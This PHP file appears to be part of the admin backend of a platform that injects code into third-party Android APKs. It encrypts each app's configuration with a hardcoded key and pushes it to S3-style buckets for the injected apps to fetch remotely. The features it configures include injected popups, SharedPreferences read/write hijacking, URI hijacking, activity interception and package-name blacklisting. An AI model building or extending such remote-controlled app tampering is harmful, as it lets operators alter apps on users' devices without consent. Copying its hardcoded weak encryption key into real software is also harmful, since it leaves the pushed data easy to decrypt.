<?php
/**
 * 配置推送到 S3/R2/B2 存储桶
 * 在管理员保存配置后调用，将加密配置推送到所有启用的桶
 */

require_once __DIR__ . '/S3Client.php';
require_once __DIR__ . '/Auth.php';

/**
 * 推送单个应用的配置到所有启用的桶
 * @param PDO $pdo 数据库连接
 * @param int $appId 应用ID
 * @return array 推送结果
 */
function pushConfigToBuckets(PDO $pdo, int $appId): array {
    // 确保 ConfigHelper 中的函数可用（fetchCol/fetchMap 依赖 global $pdo）
    $GLOBALS['pdo'] = $pdo;

    // 加载配置生成函数（如果还没加载）
    $configHelperPath = __DIR__ . '/ConfigHelper.php';
    if (!function_exists('getResponseData') && file_exists($configHelperPath)) {
        require_once $configHelperPath;
    }

    // 1. 查该应用注入任务使用的桶 ID（取并集）
    $bucketIdStmt = $pdo->prepare("SELECT bucket_ids FROM cainiao_inject_task WHERE apk_id = :id AND status_text = '编译成功' AND bucket_ids IS NOT NULL");
    $bucketIdStmt->execute([':id' => $appId]);
    $allBucketIds = [];
    while ($row = $bucketIdStmt->fetchColumn()) {
        $ids = json_decode($row, true);
        if (is_array($ids)) {
            $allBucketIds = array_merge($allBucketIds, $ids);
        }
    }
    $allBucketIds = array_unique(array_map('intval', $allBucketIds));

    // 有指定桶则只推这些桶，否则回退到全局 enabled=1（兼容旧任务）
    if (!empty($allBucketIds)) {
        $placeholders = implode(',', array_fill(0, count($allBucketIds), '?'));
        $buckets = $pdo->prepare("SELECT * FROM cainiao_s3_bucket WHERE id IN ($placeholders) AND enabled = 1");
        $buckets->execute(array_values($allBucketIds));
        $buckets = $buckets->fetchAll(PDO::FETCH_ASSOC);
    } else {
        $buckets = $pdo->query("SELECT * FROM cainiao_s3_bucket WHERE enabled = 1")
                       ->fetchAll(PDO::FETCH_ASSOC);
    }

    if (empty($buckets)) {
        return ['code' => 200, 'message' => '无启用的存储桶', 'results' => []];
    }

    // 2. 检查应用是否有成功的注入记录（没注入过的应用无需推送配置）
    $injectCheck = $pdo->prepare("SELECT 1 FROM cainiao_inject_task WHERE apk_id = :id AND status_text = '编译成功' LIMIT 1");
    $injectCheck->execute([':id' => $appId]);
    if (!$injectCheck->fetchColumn()) {
        return ['code' => 304, 'message' => "应用 {$appId} 无注入记录，跳过推送"];
    }

    // 3. 生成配置数据（和 shell.php 返回的一样）
    $response = getResponseData($pdo, $appId, 'bucket_push', false);
    if (!$response) {
        return ['code' => 404, 'message' => "应用 {$appId} 配置不存在"];
    }

    // 4. 处理复用逻辑（config_mode=1 时合并被复用应用的配置）
    $stmt = $pdo->prepare("SELECT config_mode, reuse_apk_id, reuse_options FROM cainiao_apk WHERE id = :id LIMIT 1");
    $stmt->execute([':id' => $appId]);
    $apkRow = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($apkRow && (int)$apkRow['config_mode'] === 1 && (int)$apkRow['reuse_apk_id'] > 0) {
        $reuseApkId = (int)$apkRow['reuse_apk_id'];
        $reuseOptions = json_decode($apkRow['reuse_options'] ?? '[]', true) ?: [];

        if ($reuseApkId !== $appId && !empty($reuseOptions)) {
            $reuseResponse = getResponseData($pdo, $reuseApkId, 'bucket_push', false);
            if ($reuseResponse) {
                // 复用字段映射（与 shell.php 保持一致）
                $map = [
                    '全屏弹窗' => ['enablePopups', 'popups'],
                    '图片弹窗' => ['enableImagePopups', 'imagepopups'],
                    'HTML弹窗' => ['enablehtmlPopups', 'htmlpopups'],
                    '文字弹窗' => ['enableMessagePopups', 'Messagepopups'],
                    '输入框弹窗' => ['enableinputPopups', 'inputpopups'],
                    '系统文字弹窗' => ['enable_popup_keywords', 'popup_keywords', 'popup_type'],
                    'SP写入劫持' => ['enable_sp_put', 'sp_put'],
                    'SP读取劫持' => ['enable_sp_get', 'sp_get'],
                    'SP重写' => ['enable_sp', 'sp'],
                    '通杀拦截' => ['enable_popup_kill_all', 'kill_type'],
                    'activity拦截' => ['blackActivities'],
                    '关键词拦截' => ['enable_popup_keywords', 'popup_keywords'],
                    'URI劫持' => ['replace'],
                    '静默配置' => ['black_package', 'black_package_list'],
                    '包名检测' => ['black_package', 'new_black_package_list']
                ];
                foreach ($reuseOptions as $key) {
                    if (isset($map[$key])) {
                        foreach ($map[$key] as $field) {
                            if (isset($reuseResponse[$field])) {
                                $response[$field] = $reuseResponse[$field];
                            }
                        }
                    }
                }
            }
        }
    }

    // 补充 appid 字段（shell.php 也会加）
    $response['appid'] = $appId;

    // 5. 加密（和 shell.php 同样的密钥和算法）
    $encryptionKey = '1234567890abcdef';
    $json = json_encode($response, 320);
    $encrypted = encrypt_json($json, $encryptionKey);

    // 6. 推送到每个桶
    $objectKey = "config/{$appId}.enc";
    $results = [];

    foreach ($buckets as $b) {
        try {
            $client = new S3Client(
                $b['access_key'],
                $b['secret_key'],
                $b['endpoint'],
                $b['bucket'],
                $b['region'] ?: 'auto'
            );
            $result = $client->putObject($objectKey, $encrypted);
            $results[] = [
                'bucket' => $b['name'],
                'code' => $result['code'],
                'message' => $result['message'],
            ];
        } catch (\Throwable $e) {
            $results[] = [
                'bucket' => $b['name'],
                'code' => 500,
                'message' => $e->getMessage(),
            ];
        }
    }

    return ['code' => 200, 'results' => $results];
}

/**
 * 推送单个应用 + 所有复用该应用的应用的配置到桶
 * 应用配置变更时调用此函数，确保复用方的桶文件也同步更新
 * @param PDO $pdo
 * @param int $appId 被修改的应用ID
 * @return array
 */
function pushConfigWithDependents(PDO $pdo, int $appId): array {
    // 先推送自己
    $result = pushConfigToBuckets($pdo, $appId);

    // 查找所有复用该应用的应用，级联推送
    $stmt = $pdo->prepare("SELECT id FROM cainiao_apk WHERE config_mode = 1 AND reuse_apk_id = :id");
    $stmt->execute([':id' => $appId]);
    $dependents = $stmt->fetchAll(PDO::FETCH_COLUMN);

    foreach ($dependents as $depId) {
        pushConfigToBuckets($pdo, (int)$depId);
    }

    if (!empty($dependents)) {
        $result['cascade'] = count($dependents) . ' 个复用应用已同步';
    }

    return $result;
}

/**
 * 批量推送所有应用配置到桶（管理后台"一键同步"用）
 * @param PDO $pdo
 * @return array
 */
function pushAllConfigsToBuckets(PDO $pdo): array {
    // 只查有成功注入记录的应用（没注入过的无需推送配置）
    $appIds = $pdo->query("
        SELECT DISTINCT a.id FROM cainiao_apk a
        INNER JOIN cainiao_inject_task t ON t.apk_id = a.id AND t.status_text = '编译成功'
    ")->fetchAll(PDO::FETCH_COLUMN);
    $results = [];
    $success = 0;
    $fail = 0;

    foreach ($appIds as $appId) {
        $result = pushConfigToBuckets($pdo, (int)$appId);
        if ($result['code'] === 200) {
            $success++;
        } else {
            $fail++;
        }
        $results[$appId] = $result;
    }

    return [
        'code' => 200,
        'message' => "同步完成：成功 {$success}，失败 {$fail}，共 " . count($appIds) . " 个应用",
        'data' => $results,
    ];
}
